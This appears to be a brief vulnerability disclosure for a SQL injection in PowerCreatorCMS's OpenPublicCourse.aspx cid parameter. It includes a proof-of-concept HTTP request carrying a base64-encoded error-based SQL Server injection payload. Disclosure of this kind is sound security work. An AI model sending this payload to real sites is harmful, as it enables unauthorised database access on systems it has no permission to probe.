# PowerCreatorCMS SQL injection

## installation package：http://www.powercreator.com.cn/

## Vulnerability description：

The OpenPublicCourse.aspx?cid parameter is not filtered strictly, and there is a SQL injection vulnerability

```
GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnOTInKSktLQ== HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
![image](https://github.com/user-attachments/assets/b5a03ba4-138c-49eb-9fa2-7c6346eff01f)
